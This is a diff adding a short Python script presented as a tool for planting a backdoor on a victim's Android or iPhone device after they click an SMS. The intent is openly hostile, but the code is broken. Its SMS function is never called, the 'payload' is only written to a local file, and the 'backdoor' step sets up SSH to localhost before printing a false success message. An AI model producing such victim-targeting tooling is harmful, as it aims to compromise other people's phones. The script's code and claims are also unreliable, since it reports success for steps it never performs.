@@ -1,0 +1,41 @@
+import os
+import sys
+import time
+import subprocess
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+def send_sms(phone_number, message):
+    os.system(f'termux-sms-send -n {phone_number} "{message}"')
+
+def install_backdoor(device_type):
+    if device_type == 'android':
+        subprocess.run(['pkg', 'install', 'openssh'])
+        subprocess.run(['ssh-keygen', '-t', 'rsa'])
+        subprocess.run(['ssh-copy-id', '-i', '~/.ssh/id_rsa.pub', 'localhost'])
+        subprocess.run(['ssh', 'localhost'])
+    elif device_type == 'iphone':
+        subprocess.run(['apt', 'install', 'openssh'])
+        subprocess.run(['ssh-keygen', '-t', 'rsa'])
+        subprocess.run(['ssh-copy-id', '-i', '~/.ssh/id_rsa.pub', 'localhost'])
+        subprocess.run(['ssh', 'localhost'])
+
+def main():
+    phone_number = input("Enter the victim's phone number: ")
+    device_type = input("Enter the victim's device type (android/iphone): ")
+
+    payload = "Click to install backdoor"
+    message = f"Subject: Backdoor Installation\n\n{payload}"
+
+    with open('dumb_luck.txt', 'w') as file:
+        file.write(message)
+
+    print("Waiting for the victim to click the SMS...")
+    time.sleep(60)  # Wait for 1 minute
+
+    install_backdoor(device_type)
+    print("Backdoor installed successfully.")
+
+if __name__ == '__main__':
+    main()
